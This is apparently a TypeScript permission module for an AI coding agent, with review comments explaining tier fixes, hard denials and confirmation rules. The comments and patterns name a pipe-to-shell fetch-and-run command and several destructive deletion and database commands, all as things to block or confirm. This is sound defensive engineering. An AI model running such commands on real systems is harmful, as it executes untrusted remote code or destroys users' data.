/**
 * What the agent is allowed to do, and when it has to ask.
 *
 * ## What a review of the previous version found
 *
 * **`read_only` was not read-only.** It returned `allowed: true` with
 * `requiresConfirmation: true` for `write_file`, `run_command` and everything
 * else — so a surface that answers confirmations (a UI with a remembered
 * "always allow", an automated harness) would happily let the agent write
 * files in a tier whose entire meaning is that it does not. A tier is a
 * promise about what *cannot* happen; making it a prompt is a different
 * feature with the same name.
 *
 * **`read_only` and `propose_only` were byte-for-byte identical.** Same
 * allowlist, same fallthrough, different strings. Two tiers with one
 * behaviour means one of them is lying to whoever picked it.
 *
 * **The scariest denylist entry could never match.** `"curl | sh"` as a
 * substring does not occur in real pipe-to-shell commands, because there is
 * always a URL in the middle — `curl -fsSL https://example.com/i.sh | sh`
 * contains no such substring. The pattern looked like protection and was
 * decoration; it now matches structurally.
 *
 * **Destructive commands were matched by exact flag spelling.** `rm -rf /` was
 * blocked but `rm -fr /`, `rm --recursive --force /` and `rm -r -f /` were not.
 * An attacker does not have to be clever to reorder two letters, and neither
 * does an unlucky model.
 *
 * **And it blocked ordinary work.** `eval(` and `drop table` were on the
 * *hard* denylist — unconditional, no confirmation possible — so the agent
 * could never run a database migration, or a test whose fixture contains the
 * word `eval(`. A guardrail that stops legitimate work gets switched off, and
 * then none of the others are there either. Those moved to confirmation, where
 * they belong: a person can say yes to their own migration.
 *
 * ## The shape
 *
 * Three outcomes, and they are genuinely different:
 *
 *   - **denied** — never happens, no prompt, regardless of tier.
 *   - **confirm** — happens only if a human says so, per action.
 *   - **allowed** — happens silently.
 *
 * Denial is reserved for things with no legitimate use inside a coding
 * sandbox. Everything merely *dangerous* is a confirmation, because the person
 * asking usually has a reason and the agent cannot know it.
 */

import type { PermissionTier } from "@sqcode/shared";
import { HARD_DENIED as SHARED_HARD_DENIED } from "@sqcode/sandbox-runner";
import type { LLMToolCall } from "./types.js";

export interface PermissionCheckResult {
  allowed: boolean;
  requiresConfirmation: boolean;
  reason?: string;
}

const deny = (reason: string): PermissionCheckResult => ({
  allowed: false,
  requiresConfirmation: false,
  reason,
});
const confirm = (reason: string): PermissionCheckResult => ({
  allowed: true,
  requiresConfirmation: true,
  reason,
});
const allow = (): PermissionCheckResult => ({ allowed: true, requiresConfirmation: false });

/**
 * Commands that have no legitimate use from inside a workspace sandbox.
 *
 * Deliberately short. Every entry here is unconditional — no tier, no
 * confirmation, no override — so anything with a plausible reason to exist
 * belongs in `NEEDS_CONFIRMATION` instead. A long denylist is not a safer one;
 * it is one that gets disabled.
 *
 * Imported from the sandbox runner rather than defined here, because there
 * used to be two of these lists and the *weaker* one was the one actually
 * enforced. This file only sees tool calls routed through the agent loop;
 * `validateCommandSafety` is the last thing every command passes through
 * whatever called it. One list, owned at the boundary, consulted here.
 */
const HARD_DENIED = SHARED_HARD_DENIED;

/**
 * Dangerous, but with real uses. These ask.
 *
 * Recursive deletion is matched on the *flags* rather than their spelling,
 * because `-rf`, `-fr`, `-r -f` and `--recursive --force` are the same command
 * and only the first was previously caught.
 */
const NEEDS_CONFIRMATION: { pattern: RegExp; why: string; irreversible?: boolean }[] = [
  {
    pattern: /\brm\b(?=[^|;&]*\s-{1,2}(r|recursive))(?=[^|;&]*\s-{1,2}(f|force))|\brm\s+-[a-z]*r[a-z]*f|\brm\s+-[a-z]*f[a-z]*r/,
    why: "recursive force-delete",
    irreversible: true,
  },
  { pattern: /\bdrop\s+(table|database|schema)\b/i, why: "dropping database objects", irreversible: true },
  { pattern: /\btruncate\s+table\b/i, why: "emptying a table", irreversible: true },
  { pattern: /\bgit\s+push\b/, why: "publishing to a remote", irreversible: true },
  { pattern: /\bgit\s+reset\s+--hard\b/, why: "discarding uncommitted work", irreversible: true },
  { pattern: /\bgit\s+clean\s+-[a-z]*f/, why: "deleting untracked files", irreversible: true },
  { pattern: /\bsudo\b/, why: "running as root", irreversible: true },
  {
    // Genuinely one-way: a published version cannot be recalled after 72
    // hours, and never from someone's lockfile. It was missing from the
    // irreversible set entirely.
    pattern: /\b(npm|pnpm|yarn)\s+publish\b/,
    why: "publishing a package",
    irreversible: true,
  },
  { pattern: /\bkill(all)?\b\s+-9/, why: "force-killing processes" },
  { pattern: /\bshutdown\b|\breboot\b/, why: "stopping the machine" },
  {
    pattern: /\bremove-item\b[^|;&]*-recurse[^|;&]*-force/i,
    why: "recursive force-delete",
    irreversible: true,
  },
  { pattern: /\bdel\s+\/[fsq]/i, why: "force-deleting files", irreversible: true },
];

/** Tools that only observe. Everything absent from this list can change
 *  something, which is what makes the tiers below meaningful. */
const READ_ONLY_TOOLS = new Set([
  "read_file",
  "list_directory",
  "grep_search",
  "glob",
  "web_search",
  "fetch_url_content",
  "research",
  "find_symbol_definition",
  "find_symbol_references",
  "browser_screenshot",
  "browser_console_logs",
  // Reading the page changes nothing on it.
  "browser_snapshot",
  "update_todo_list",
  // Reading a process's state and waiting on a timer change nothing.
  "process_status",
  "wait",
  "schedule_wakeup",
  // Looking at an image, asking the person a question, and reading the
  // sub-agent roster all observe and nothing else.
  "view_image",
  "ask_user",
  "subagent_status",
  // The agent's own memory, and a search over the index.
  "update_task_state",
  "remember",
  "edit_memory",
  "forget",
  "recall",
  "use_skill",
  "retrieve_context",
  "code_graph",
]);

/**
 * Observes, but by executing something.
 *
 * `run_tests` is here rather than in `READ_ONLY_TOOLS` because it runs
 * arbitrary project code — but both `docs/ARCHITECTURE.md` and the system
 * prompt state that `read_only` may run tests, so it is admitted there too.
 * Written down because the two facts look contradictory and the next reader
 * would otherwise "fix" one of them.
 */
const EXECUTES_TO_OBSERVE = new Set([
  "run_tests",
  "browser_open",
  // Only ever stops a process the agent itself started; never asks.
  "stop_process",
]);

function commandOf(input: Record<string, unknown>): string | null {
  const raw = input["command"];
  if (typeof raw !== "string") return null;
  return raw.toLowerCase().replace(/\s+/g, " ").trim();
}

export function evaluateToolPermission(
  toolCall: LLMToolCall,
  permissionTier: PermissionTier = "guarded_autonomy",
): PermissionCheckResult {
  const tool = toolCall.name;
  const input = toolCall.input;

  // ---- Absolute denials, before any tier is consulted ----------------------

  const cmd = commandOf(input);
  if (cmd) {
    for (const { pattern, why } of HARD_DENIED) {
      if (pattern.test(cmd)) {
        return deny(`Hard denylist violation: ${why}. Blocked in every permission tier.`);
      }
    }
  }

  /*
   * `data:` joins the list: a data URL can carry a whole HTML document with
   * script in it, which is the same capability as `javascript:` by another
   * spelling. A batch's steps are each held to the same rule; a batch is not
   * a way around it.
   */
  const browserUrls =
    tool === "browser_open" || tool === "browser_interact"
      ? [input["url"]]
      : tool === "browser_batch" && Array.isArray(input["steps"])
        ? (input["steps"] as Array<Record<string, unknown> | null>).map((s) => s?.["url"])
        : [];
  for (const raw of browserUrls) {
    if (typeof raw === "string" && /^(javascript|vbscript|data):/.test(raw.toLowerCase().trim())) {
      return deny(
        "Hard denylist violation: script-bearing URI schemes are not permitted in the browser.",
      );
    }
  }

  // ---- Tiers ---------------------------------------------------------------

  if (permissionTier === "read_only") {
    if (READ_ONLY_TOOLS.has(tool) || tool === "run_tests") return allow();
    /*
     * Denied, not confirmed.
     *
     * This is the fix for the finding at the top of the file. `read_only` is a
     * statement about what the agent *cannot* do; if a confirmation can unlock
     * it, then the guarantee is only as strong as whatever answers the prompt,
     * and an automated approver silently removes it entirely.
     */
    return deny(
      `'${tool}' can modify state, and this session is read-only. ` +
        `Switch to propose_only or higher to allow it.`,
    );
  }

  if (permissionTier === "propose_only") {
    if (READ_ONLY_TOOLS.has(tool) || EXECUTES_TO_OBSERVE.has(tool)) return allow();
    // The tier's actual meaning, and what now distinguishes it from read_only:
    // the agent may propose any change, and a person approves each one.
    return confirm(`'${tool}' changes something. Approve this specific action?`);
  }

  if (permissionTier === "guarded_autonomy") {
    if (tool === "install_package") {
      return confirm(
        `Install '${String(input["package_name"] ?? "package")}'? New dependencies run their own install scripts.`,
      );
    }
    if (tool === "git_operation") {
      const op = String(input["operation"] ?? "");
      if (op === "push" || op === "force_push") {
        return confirm(
          op === "force_push"
            ? "A git force-push rewrites history others may have pulled."
            : "A git push publishes to a remote others can see.",
        );
      }
    }
    if (cmd) {
      for (const { pattern, why } of NEEDS_CONFIRMATION) {
        if (pattern.test(cmd)) return confirm(`This command performs ${why}.`);
      }
    }
    return allow();
  }

  if (permissionTier === "full_autonomy") {
    /*
     * Full autonomy still asks about the unrecoverable.
     *
     * The previous version confirmed only `force_push`, so `rm -rf ~` ran
     * unattended — and `rm -rf` was on the *hard* denylist only in the exact
     * form `rm -rf /`. "Full autonomy" is a statement about not being asked
     * over routine work, not a request to lose a home directory without being
     * asked. The list is deliberately tiny: things with no undo.
     */
    if (tool === "git_operation" && String(input["operation"]) === "force_push") {
      return confirm("A git force-push rewrites history on a remote. This always asks.");
    }
    /*
     * A plain `push` asks here too.
     *
     * Only `force_push` used to, which left the ordinary case — publishing to
     * a remote other people pull from — unconfirmed in the one mode where
     * nothing else would catch it either.
     */
    if (tool === "git_operation") {
      const op = String(input["operation"]);
      if (op === "push") {
        return confirm("A git push publishes to a remote. This always asks.");
      }
    }
    if (cmd) {
      /*
       * Selected by a flag, not by matching the prose.
       *
       * This used to filter `NEEDS_CONFIRMATION` with a regex over each rule's
       * human-readable `why` string. Rewording a message a user sees would
       * have silently removed a guard, and nothing would have failed.
       */
      for (const rule of NEEDS_CONFIRMATION) {
        if (rule.irreversible && rule.pattern.test(cmd)) {
          return confirm(`This command performs ${rule.why}, which cannot be undone.`);
        }
      }
    }
    return allow();
  }

  return allow();
}
